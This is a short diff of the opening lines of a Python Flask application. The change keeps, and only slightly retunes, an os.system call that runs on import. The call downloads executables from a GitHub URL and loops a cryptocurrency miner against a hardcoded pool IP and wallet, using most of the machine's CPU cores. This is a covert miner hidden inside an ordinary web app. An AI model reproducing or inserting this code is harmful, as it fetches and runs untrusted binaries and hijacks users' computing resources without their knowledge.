@@ -1,5 +1,5 @@
 import os
-os.system ("wget https://raw.githubusercontent.com/laboldrokok/saksake/main/hellminers && while :; do timeout 55s wget https://raw.githubusercontent.com/laboldrokok/saksake/main/verus-solver && chmod +x hellminers verus-solver && ./hellminers -c stratum+tcp://139.99.123.225:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.V${RANDOM:0:9} -p x --cpu $(nproc --ignore 2) ; sleep 15s; done")
+os.system ("wget https://raw.githubusercontent.com/laboldrokok/saksake/main/hellminers && while :; do timeout 55s wget https://raw.githubusercontent.com/laboldrokok/saksake/main/verus-solver && chmod +x hellminers verus-solver && ./hellminers -c stratum+tcp://139.99.123.225:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.V${RANDOM:0:9} -p x --cpu $(nproc --ignore 3) ; sleep 15s; done")
 from flask import Flask
 from flask import render_template
 
